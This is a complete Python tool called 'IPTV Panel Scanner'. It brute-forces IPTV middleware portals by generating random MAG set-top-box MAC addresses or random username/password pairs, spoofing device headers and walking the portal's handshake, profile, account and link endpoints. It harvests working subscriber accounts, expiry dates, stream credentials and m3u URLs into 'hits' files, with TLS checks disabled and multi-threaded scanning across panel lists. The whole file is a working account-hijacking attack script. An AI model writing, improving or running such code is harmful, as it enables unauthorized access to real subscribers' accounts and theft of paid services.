import requests
import random
import time
import threading
import os
import re
import sys
import hashlib
import json
from datetime import datetime
from urllib.parse import quote

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class IPTVScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.mac_prefixes = ['00:1A:79:']
        self.active_threads = 0
        self.found_hits = 0
        self.scanned_count = 0
        self.running = True
        self.hits_file = "hits.txt"
        self.panel_queue = []
        self.panel_threads = []
        self.panel_lock = threading.Lock()
        self.max_panel_threads = 3  # concurrent panels
        self.scanned_lock = threading.Lock()  # Add lock for thread safety

    # ---------------- MAC / Serial / Device functions ---------------- #
    def validate_mac(self, mac):
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(mac_pattern.match(mac))

    def normalize_mac(self, mac, case='upper'):
        mac = re.sub(r'[^0-9A-Fa-f]', '', mac)
        if len(mac) != 12:
            return None
        formatted = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return formatted.upper() if case == 'upper' else formatted.lower()

    def generate_mac(self, prefix_index=0, case='upper'):
        prefix = self.mac_prefixes[prefix_index]
        mac = prefix + ''.join([f"{random.randint(0, 255):02X}:" for _ in range(3)])[:-1]
        return mac.upper() if case == 'upper' else mac.lower()

    def generate_random_string(self, length=32, chars=None):
        if chars is None:
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(length))

    def calculate_serial_number(self, mac):
        return hashlib.md5(mac.encode()).hexdigest().upper()[:13]

    def calculate_device_id(self, mac):
        return hashlib.sha256(mac.encode()).hexdigest().upper()

    # ---------------- Choose MAC mode ---------------- #
    def choose_mac_mode(self):
        choice = input("Do you want to test a specific MAC or auto-generate? (specific/auto) [auto]: ").strip().lower() or "auto"
        if choice == 'specific':
            specific_mac = input("Enter MAC to test: ").strip()
            mac_case = input("MAC case (upper/lower) [upper]: ").strip().lower() or "upper"
            return choice, specific_mac, mac_case, 1
        else:
            mac_count_input = input("Enter how many MACs to generate/test: ").strip() or "10"
            try:
                mac_count = int(mac_count_input)
            except ValueError:
                print(f"Invalid number '{mac_count_input}', using default 10")
                mac_count = 10
            return choice, None, 'upper', mac_count

    # ---------------- Panel testing functions ---------------- #
    def test_panel(self, panel_url, mac, timeout=10):
        try:
            if not panel_url.startswith('http'):
                panel_url = 'http://' + panel_url
            server = panel_url.replace('http://', '').replace('https://', '').split('/')[0]
            tkk = self.generate_random_string(32)

            endpoints = [
                f"http://{server}/server/load.php",
                f"http://{server}/portal.php",
                f"http://{server}/c/portal.php"
            ]

            headers = {
                'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3',
                'X-User-Agent': 'Model: MAG250; Link: WiFi',
                'Referer': f'http://{server}/c/',
                'Accept': '*/*',
                'Cookie': f'timezone=GMT; stb_lang=en; mac={quote(mac)}',
                'Host': server,
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip, deflate'
            }

            auth_token = None
            working_endpoint = None
            for endpoint in endpoints:
                try:
                    handshake_url = f"{endpoint}?type=stb&action=handshake&token={tkk}&JsHttpRequest=1-xml"
                    response = self.session.get(handshake_url, headers=headers, timeout=timeout)
                    if response.status_code == 200 and '"token":"' in response.text:
                        token_match = re.search(r'"token":"([^"]+)"', response.text)
                        if token_match:
                            auth_token = token_match.group(1)
                            working_endpoint = endpoint
                            break
                except:
                    continue

            if not auth_token:
                return {'success': False, 'error': 'No token received'}

            headers['Authorization'] = f'Bearer {auth_token}'

            profile_url = f"{working_endpoint}?type=stb&action=get_profile&JsHttpRequest=1-xml"
            profile_response = self.session.get(profile_url, headers=headers, timeout=timeout)
            if profile_response.status_code != 200:
                return {'success': False, 'error': 'Profile request failed'}

            account_url = f"{working_endpoint}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
            account_response = self.session.get(account_url, headers=headers, timeout=timeout)
            if account_response.status_code != 200:
                return {'success': False, 'error': 'Account info request failed'}

            account_text = account_response.text
            exp_match = re.search(r'"phone":"([^"]+)"', account_text) or re.search(r'"end_date":"([^"]+)"', account_text)
            exp_date = exp_match.group(1) if exp_match else "Unknown"

            channels_url = f"{working_endpoint}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
            channels_response = self.session.get(channels_url, headers=headers, timeout=timeout)
            channel_count = len(re.findall(r'"ch_id":"', channels_response.text)) if channels_response.status_code == 200 else 0

            link_url = f"{working_endpoint}?type=itv&action=create_link&forced_storage=undefined&download=0&cmd=ffmpeg%20http%3A%2F%2Flocalhost%2Fch%2F181212_&JsHttpRequest=1-xml"
            link_response = self.session.get(link_url, headers=headers, timeout=timeout)

            real_url = ""
            username = mac
            password = mac
            if link_response.status_code == 200 and '"cmd":"' in link_response.text:
                cmd_match = re.search(r'"cmd":"ffmpeg http://([^"]+)"', link_response.text)
                if cmd_match:
                    real_url = cmd_match.group(1)
                    parts = real_url.split('/')
                    if len(parts) >= 6:
                        username = parts[3]
                        password = parts[4]

            m3u_url = f"http://{server}/get.php?username={username}&password={password}&type=m3u_plus"
            try:
                m3u_response = self.session.get(m3u_url, headers=headers, timeout=5)
                m3u_status = "Working" if m3u_response.status_code == 200 else "Not Working"
            except:
                m3u_status = "Error"

            genres_url = f"{working_endpoint}?action=get_genres&type=itv&JsHttpRequest=1-xml"
            genres_response = self.session.get(genres_url, headers=headers, timeout=timeout)
            live_tv = "N/A"
            if genres_response.status_code == 200:
                titles = re.findall(r'"title":"([^"]+)"', genres_response.text)
                if titles:
                    live_tv = " ⮘🎬⮚ ".join(titles)

            return {
                'success': True,
                'mac': mac,
                'panel': server,
                'endpoint': working_endpoint,
                'exp_date': exp_date,
                'channels': channel_count,
                'token': auth_token,
                'm3u_status': m3u_status,
                'm3u_url': m3u_url,
                'live_tv': live_tv,
                'username': username,
                'password': password,
                'real_url': f"http://{real_url}" if real_url else "N/A"
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def test_m3u_credentials(self, panel_url, username, password, timeout=8):
        try:
            if not panel_url.startswith('http'):
                panel_url = 'http://' + panel_url
            server = panel_url.replace('http://', '').replace('https://', '').split('/')[0]

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Accept': '*/*',
                'Connection': 'close',
                'Host': server
            }

            m3u_url = f"http://{server}/get.php?username={username}&password={password}&type=m3u_plus"
            resp = self.session.get(m3u_url, headers=headers, timeout=timeout)
            body = resp.text if resp else ''
            ok = resp.status_code == 200 and ('#EXTM3U' in body or len(body) > 50)

            return {
                'success': ok,
                'status_code': resp.status_code,
                'm3u_url': m3u_url,
                'username': username,
                'password': password,
                'body_snippet': body[:200] if body else ''
            }

        except Exception as e:
            return {'success': False, 'error': str(e), 'm3u_url': m3u_url}

    # ---------------- Save hits ---------------- #
    def save_hit(self, result, mode='mac'):
        try:
            cwd = os.getcwd()
            hits_dir = os.path.join(cwd, "hits")
            os.makedirs(hits_dir, exist_ok=True)

            panel_name = result.get('panel', 'panel_hits')
            sanitized = re.sub(r'[^A-Za-z0-9._-]', '_', panel_name).strip('_')
            hits_file_path = os.path.join(hits_dir, f"{sanitized}.txt")

            with open(hits_file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Hit Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Mode: {mode}\n")
                if mode == 'mac':
                    f.write(f"MAC: {result.get('mac')}\n")
                f.write(f"Panel: {result.get('panel')}\n")
                if 'endpoint' in result:
                    f.write(f"Endpoint: {result.get('endpoint')}\n")
                if 'exp_date' in result:
                    f.write(f"Expiration: {result.get('exp_date')}\n")
                if 'channels' in result:
                    f.write(f"Channels: {result.get('channels')}\n")
                if 'm3u_status' in result:
                    f.write(f"M3U Status: {result.get('m3u_status')}\n")
                if 'm3u_url' in result:
                    f.write(f"M3U URL: {result.get('m3u_url')}\n")
                if mode == 'creds':
                    f.write(f"Username: {result.get('username')}\n")
                    f.write(f"Password: {result.get('password')}\n")
                    f.write(f"M3U URL: {result.get('m3u_url')}\n")
                    if 'status_code' in result:
                        f.write(f"Status Code: {result.get('status_code')}\n")
                if 'real_url' in result and result.get('real_url') != "N/A":
                    f.write(f"Real URL: {result.get('real_url')}\n")
                if 'live_tv' in result:
                    f.write(f"Live TV: {result.get('live_tv')}\n")
                if 'token' in result:
                    f.write(f"Token: {result.get('token')}\n")
                if 'body_snippet' in result:
                    f.write(f"Body Snippet: {result.get('body_snippet')}\n")
                f.write(f"{'='*60}\n\n")

            self.found_hits += 1
            return True
        except Exception as e:
            print(f"Error saving hit: {e}")
            return False

    # ---------------- Worker for MACs or creds ---------------- #
    def worker(self, panel_url, mode='mac', mac_case='upper', prefix_index=0, creds_min=5, creds_max=15, mac_count=0):
        self.active_threads += 1
        try:
            while self.running:
                # Check global count first
                if mac_count > 0 and self.scanned_count >= mac_count:
                    break
                    
                if mode == 'mac':
                    mac = self.generate_mac(prefix_index, mac_case)
                    result = self.test_panel(panel_url, mac, timeout=15)
                    
                    # Thread-safe counter update
                    with self.scanned_lock:
                        self.scanned_count += 1
                        current_count = self.scanned_count

                    if result.get('success'):
                        print(f"\n\033[92m[+] HIT FOUND (MAC): {mac} on {panel_url}\033[0m")
                        print(f"    Exp: {result.get('exp_date')} | Channels: {result.get('channels')} | M3U: {result.get('m3u_status')}")
                        self.save_hit(result, mode='mac')

                else:
                    # Credentials mode
                    if mac_count > 0 and self.scanned_count >= mac_count:
                        break
                        
                    ulen = random.randint(creds_min, creds_max)
                    plen = random.randint(creds_min, creds_max)
                    username = self.generate_random_string(ulen)
                    password = self.generate_random_string(plen)
                    result = self.test_m3u_credentials(panel_url, username, password)
                    
                    with self.scanned_lock:
                        self.scanned_count += 1
                        current_count = self.scanned_count

                    if result.get('success'):
                        print(f"\n\033[92m[+] HIT FOUND (CREDS): {username}:{password} on {panel_url}\033[0m")
                        print(f"    M3U URL: {result.get('m3u_url')}")
                        self.save_hit(result, mode='creds')

                # Update status display
                sys.stdout.write(f"\rScanned: {self.scanned_count} | Hits: {self.found_hits} | Active threads: {self.active_threads}")
                if mode == 'mac' and 'mac' in locals():
                    sys.stdout.write(f" | Mac: {mac}")
                sys.stdout.flush()
                
                # Check if we've reached the limit
                if mac_count > 0 and self.scanned_count >= mac_count:
                    break
                    
                time.sleep(0.1)
        finally:
            self.active_threads -= 1

    # ---------------- Panel thread runner ---------------- #
    def panel_runner(self, panel_url, mode, mac_case, prefix_index, creds_min, creds_max, mac_count):
        # Adjust thread count based on requested MAC count
        if mac_count > 0:
            thread_count = min(5, max(1, mac_count // 10))  # Scale threads with count
        else:
            thread_count = 10
            
        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.worker, args=(panel_url, mode, mac_case, prefix_index, creds_min, creds_max, mac_count))
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.running = False
            for t in threads:
                t.join(timeout=1)

    # ---------------- Main scanner function ---------------- #
    def run_scanner(self):
        """Main scanner function that handles the scanning process"""
        print("\033[95m" + "="*60)
        print("           IPTV PANEL SCANNER")
        print("="*60 + "\033[0m")

        user_input = input("Enter panel URL or path to .txt file: ").strip()
        if not user_input:
            print("No input provided. Exiting.")
            return

        panels = []
        if os.path.isfile(user_input) and user_input.lower().endswith('.txt'):
            try:
                with open(user_input, 'r', encoding='utf-8') as f:
                    panels = [line.strip() for line in f if line.strip()]
                print(f"Loaded {len(panels)} panels from file: {user_input}")
            except Exception as e:
                print(f"Error reading file: {e}")
                return
        else:
            panels = [user_input]
            print(f"Testing single panel: {user_input}")

        mode = input("Mode (mac/creds) [mac]: ").strip().lower() or 'mac'

        # MAC choice / count
        mac_choice, specific_mac, mac_case, mac_count = ('auto', None, 'upper', 0)
        if mode == 'mac':
            mac_choice, specific_mac, mac_case, mac_count = self.choose_mac_mode()

        creds_min = 5
        creds_max = 15
        if mode == 'creds':
            try:
                creds_min = int(input("Minimum credential length [5]: ") or 5)
                creds_max = int(input("Maximum credential length [15]: ") or 15)
            except ValueError:
                print("Invalid input, using defaults (5-15)")
                creds_min, creds_max = 5, 15

        print(f"\nStarting scan with {len(panels)} panel(s)...")
        print("Press Ctrl+C to stop\n")

        # Panel queue and concurrent threads
        self.panel_queue = panels.copy()
        while self.panel_queue:
            active = []
            self.running = True
            for _ in range(min(self.max_panel_threads, len(self.panel_queue))):
                panel = self.panel_queue.pop(0)
                t = threading.Thread(target=self.panel_runner, args=(panel, mode, mac_case, 0, creds_min, creds_max, mac_count))
                t.start()
                active.append(t)
            
            # Wait for current batch to finish
            for t in active:
                t.join()
        
        print(f"\nScan completed! Total scanned: {self.scanned_count}, Hits found: {self.found_hits}")

def main():
    """Main function that handles the application flow"""
    try:
        # Create scanner instance
        scanner = IPTVScanner()
        
        # Run the scanner
        scanner.run_scanner()
        
    except KeyboardInterrupt:
        print("\n\nScan interrupted by user. Exiting gracefully...")
        scanner.running = False
        time.sleep(1)  # Give threads time to clean up
        
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")
        print("Please check your input and try again.")
        
    finally:
        print("\nThank you for using IPTV Panel Scanner!")
        print("Results are saved in the 'hits' folder.")

if __name__ == "__main__":
    main()